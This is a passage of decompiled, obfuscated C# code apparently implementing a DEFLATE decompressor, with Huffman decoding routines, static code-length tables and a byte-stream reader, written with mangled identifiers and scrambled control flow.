label_11:
          index = num6;
label_12:
          if (true)
          {
            if (num5 >= 0)
            {
              num3 = (int) this.\u0001[num9 | index >> 9];
              if (false)
                goto label_20;
              else
                goto label_15;
            }
            else
            {
              int num11 = obj0.\u0002();
              int num12 = obj0.\u0002(num11);
              int num13 = (int) this.\u0001[num9 | num12 >> 9];
              if ((num13 & 15) <= num11)
              {
                obj0.\u0002(num13 & 15);
                num5 = num13;
              }
              else
                goto label_19;
            }
          }
          else
            goto label_8;
label_18:
          num8 = num5 >> 4;
          if (false)
          {
            num1 = num8;
            continue;
          }
          goto label_5;
label_20:
          num4 = obj0.\u0002();
          num2 = (int) this.\u0001[obj0.\u0002(num4)];
          if (num2 >= 0)
          {
            num5 = num2;
            num6 = 15;
            if (num6 == 0)
              goto label_11;
            else
              goto label_22;
          }
          else
            goto label_24;
label_25:
          num5 = num2 = (int) this.\u0001[index];
          goto label_3;
        }
        return num7 >> 4;
label_15:
        obj0.\u0002(num3 & 15);
        return num3 >> 4;
label_5:
        return num8;
label_19:
        return -1;
label_22:
        if ((num5 & num6) <= num4)
        {
          obj0.\u0002(num2 & 15);
          return num2 >> 4;
        }
label_24:
        return -1;
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0002.\u0002.\u0004 \u0001;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte \u0001;
      private int \u0007;
      private static readonly int[] \u0003;

      public bool \u0002([In] \u0002.\u0002.\u0002 obj0)
      {
        int num1;
        while (true)
        {
          do
          {
            switch (this.\u0001)
            {
              case 0:
                this.\u0002 = obj0.\u0002(5);
                num1 = this.\u0002;
                if (true)
                {
                  if (num1 < 0)
                    return false;
                  continue;
                }
                goto label_4;
              case 1:
                goto label_5;
              case 2:
                goto label_8;
              case 3:
                goto label_15;
              case 4:
                goto label_25;
              case 5:
                goto label_32;
              default:
                continue;
            }
          }
          while (false);
          goto label_42;
label_5:
          this.\u0003 = obj0.\u0002(5);
          if (this.\u0003 >= 0)
          {
            ++this.\u0003;
            obj0.\u0002(5);
            this.\u0005 = this.\u0002 + this.\u0003;
            this.\u0002 = new byte[this.\u0005];
            this.\u0001 = 2;
          }
          else
            goto label_6;
label_8:
          this.\u0004 = obj0.\u0002(4);
          if (true)
          {
            if (this.\u0004 >= 0)
            {
              this.\u0004 += 4;
              obj0.\u0002(4);
              this.\u0001 = new byte[19];
              this.\u0007 = 0;
              this.\u0001 = 3;
              goto label_15;
            }
            else
              goto label_10;
          }
          else
            goto label_21;
label_12:
          int num2 = obj0.\u0002(3);
          if (num2 >= 0)
          {
            obj0.\u0002(3);
            this.\u0001[\u0002.\u0002.\u0005.\u0003[this.\u0007]] = (byte) num2;
            ++this.\u0007;
          }
          else
            goto label_13;
label_15:
          int num3 = this.\u0007;
          int num4 = this.\u0004;
          int num5 = num3;
label_16:
          if (true)
          {
            if (num5 >= num4)
              this.\u0001 = new \u0002.\u0002.\u0004(this.\u0001);
            else
              goto label_12;
          }
          else
            goto label_23;
label_19:
          if (true)
            this.\u0001 = (byte[]) null;
          else
            goto label_8;
label_21:
          this.\u0007 = 0;
          this.\u0001 = 4;
          goto label_25;
label_23:
          if (num5 == num4)
            goto label_24;
label_25:
          int num6;
          if (((num6 = this.\u0001.\u0002(obj0)) & -16) == 0)
          {
            this.\u0002[this.\u0007++] = this.\u0001 = (byte) num6;
            num5 = this.\u0007;
            num4 = this.\u0005;
            if (false)
              goto label_16;
            else
              goto label_23;
          }
          else if (num6 >= 0)
          {
            if (num6 >= 17)
              this.\u0001 = (byte) 0;
            if (true)
            {
              this.\u0006 = num6 - 16;
              this.\u0001 = 5;
            }
            else
              goto label_12;
          }
          else
            goto label_27;
label_32:
          int num7 = \u0002.\u0002.\u0005.\u0002[this.\u0006];
          int num8 = obj0.\u0002(num7);
          if (num8 >= 0)
          {
            obj0.\u0002(num7);
            int num9 = num8 + \u0002.\u0002.\u0005.\u0001[this.\u0006];
            while (num9-- > 0)
              this.\u0002[this.\u0007++] = this.\u0001;
            if (this.\u0007 != this.\u0005)
            {
              if (true)
              {
                this.\u0001 = 4;
                continue;
              }
              goto label_19;
            }
            else
              goto label_38;
          }
          else
            goto label_33;
label_42:
          this.\u0002 += 257;
          obj0.\u0002(5);
          this.\u0001 = 1;
          goto label_5;
        }
label_4:
        return num1 != 0;
label_6:
        return false;
label_10:
        return false;
label_13:
        return false;
label_24:
        return true;
label_27:
        return false;
label_33:
        return false;
label_38:
        return true;
      }

      public \u0002.\u0002.\u0004 \u0002()
      {
        byte[] destinationArray = new byte[this.\u0002];
        Array.Copy((Array) this.\u0002, 0, (Array) destinationArray, 0, this.\u0002);
        return new \u0002.\u0002.\u0004(destinationArray);
      }

      public \u0002.\u0002.\u0004 \u0003()
      {
        byte[] destinationArray = new byte[this.\u0003];
        Array.Copy((Array) this.\u0002, this.\u0002, (Array) destinationArray, 0, this.\u0003);
        return new \u0002.\u0002.\u0004(destinationArray);
      }

      static \u0005()
      {
        int length = 3;
        if (length != 0)
        {
          int[] numArray = new int[length];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0003.\u0001));
          \u0002.\u0002.\u0005.\u0001 = numArray;
        }
        else
          goto label_4;
label_2:
        do
        {
          \u0002.\u0002.\u0005.\u0002 = new int[3]
          {
            2,
            3,
            7
          };
        }
        while (false);
        length = 19;
label_4:
        int[] numArray1 = new int[length];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0003.\u0001));
        \u0002.\u0002.\u0005.\u0003 = numArray1;
        if (false)
          goto label_2;
      }
    }

    internal sealed class \u0006
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private static readonly short[] \u0001;
      private static readonly byte[] \u0002;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;

      public static short \u0002([In] int obj0) => (short) ((int) \u0002.\u0002.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0002.\u0002.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0002.\u0002.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0002.\u0002.\u0006.\u0001[obj0 >> 12]);

      static \u0006()
      {
label_0:
        \u0002.\u0002.\u0006.\u0001 = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
        int length1;
        if (true)
        {
          \u0002.\u0002.\u0006.\u0001 = new byte[16]
          {
            (byte) 0,
            (byte) 8,
            (byte) 4,
            (byte) 12,
            (byte) 2,
            (byte) 10,
            (byte) 6,
            (byte) 14,
            (byte) 1,
            (byte) 9,
            (byte) 5,
            (byte) 13,
            (byte) 3,
            (byte) 11,
            (byte) 7,
            (byte) 15
          };
          \u0002.\u0002.\u0006.\u0001 = new short[286];
          \u0002.\u0002.\u0006.\u0002 = new byte[286];
          if (true)
          {
            length1 = 0;
            goto label_23;
          }
        }
        else
          goto label_15;
label_7:
        int index;
        int num1;
        while (true)
        {
          num1 = index;
          if (true)
          {
            if (num1 < 256)
            {
              \u0002.\u0002.\u0006.\u0001[index] = \u0002.\u0002.\u0006.\u0002(256 + index << 7);
              \u0002.\u0002.\u0006.\u0002[index++] = (byte) 9;
            }
            else
              break;
          }
          else
            goto label_12;
        }
label_11:
        num1 = index;
label_12:
        if (num1 < 280)
        {
          \u0002.\u0002.\u0006.\u0001[index] = \u0002.\u0002.\u0006.\u0002(index - 256 << 9);
          if (true)
          {
            \u0002.\u0002.\u0006.\u0002[index++] = (byte) 7;
            goto label_11;
          }
          else
            goto label_0;
        }
label_15:
        for (; index < 286; \u0002.\u0002.\u0006.\u0002[index++] = (byte) 8)
          \u0002.\u0002.\u0006.\u0001[index] = \u0002.\u0002.\u0006.\u0002(index - 88 << 8);
        int length2 = 30;
label_17:
        if (length2 != 0)
        {
          \u0002.\u0002.\u0006.\u0002 = new short[length2];
          length1 = 30;
          if (length1 != 0)
          {
            \u0002.\u0002.\u0006.\u0003 = new byte[length1];
            index = 0;
          }
          else
            goto label_23;
        }
        else
          goto label_22;
label_21:
        length2 = index;
label_22:
        if (length2 >= 30)
          return;
        \u0002.\u0002.\u0006.\u0002[index] = \u0002.\u0002.\u0006.\u0002(index << 11);
        \u0002.\u0002.\u0006.\u0003[index] = (byte) 5;
        ++index;
        goto label_21;
label_23:
        index = length1;
        int num2;
        int num3;
        while (true)
        {
          num2 = index;
          num3 = 144;
          if (num3 != 0)
          {
            if (num2 < num3)
            {
              \u0002.\u0002.\u0006.\u0001[index] = \u0002.\u0002.\u0006.\u0002(48 + index << 8);
              \u0002.\u0002.\u0006.\u0002[index++] = (byte) 8;
            }
            else
              goto label_7;
          }
          else
            break;
        }
        length2 = num3;
        length2 = num2;
        goto label_17;
      }
    }

    internal sealed class \u0007 : MemoryStream
    {
      public int \u0002() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0003() => this.\u0002() | this.\u0002() << 16;

      public \u0007([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
